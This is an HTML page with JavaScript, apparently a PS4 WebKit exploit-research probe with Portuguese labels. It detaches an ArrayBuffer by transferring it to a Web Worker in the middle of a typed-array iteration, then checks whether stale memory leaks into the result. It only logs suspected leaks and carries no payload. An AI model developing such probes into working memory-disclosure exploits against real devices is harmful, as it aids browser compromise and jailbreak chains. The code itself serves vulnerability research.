<!DOCTYPE html>

<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Info Leak Candidate Test</title>
<style>
body { background:#000; color:#0f0; font-family:monospace; padding:20px; }
button { width:100%; padding:15px; margin-bottom:10px; font-size:16px; }
#log { border:1px solid #333; padding:10px; height:300px; overflow:auto; }
.leak { color:#ff0; font-weight:bold; }
.safe { color:#888; }
</style>
</head>
<body>

<h2>TypedArray Iterator + Detach (Info Leak Probe)</h2>
<p>Objetivo: detectar leitura inconsistente após detach de ArrayBuffer durante iteração nativa.</p>

<button onclick="runTest()">Executar Teste</button>

<div id="log"></div>

<script>
const logDiv = document.getElementById('log');
function log(msg, cls='safe') {
  const d = document.createElement('div');
  d.textContent = msg;
  d.className = cls;
  logDiv.appendChild(d);
  logDiv.scrollTop = logDiv.scrollHeight;
}

function runTest() {
  log('Iniciando teste...');

  const ab = new ArrayBuffer(0x1000);
  const ta = new Uint32Array(ab);
  for (let i = 0; i < ta.length; i++) ta[i] = 0x41414141;

  const workerCode = `onmessage = e => postMessage('ok', [e.data]);`;
  const worker = new Worker(URL.createObjectURL(new Blob([workerCode])));

  const iter = {
    [Symbol.iterator]() {
      let i = 0;
      return {
        next() {
          if (i === 8) {
            // Detach real do buffer
            worker.postMessage(ab, [ab]);
          }
          if (i >= ta.length) return { done:true };
          return { value: ta[i++], done:false };
        }
      };
    }
  };

  try {
    const res = new Uint32Array(iter);
    for (let i = 0; i < res.length; i++) {
      const v = res[i];
      if (v !== 0x41414141 && v !== 0) {
        log(`LEAK POTENCIAL: index ${i} => 0x${v.toString(16)}`, 'leak');
        return;
      }
    }
    log('Nenhum vazamento observado (comportamento seguro).');
  } catch (e) {
    log('Exceção capturada: ' + e.message);
  }
}
</script>

</body>
</html>
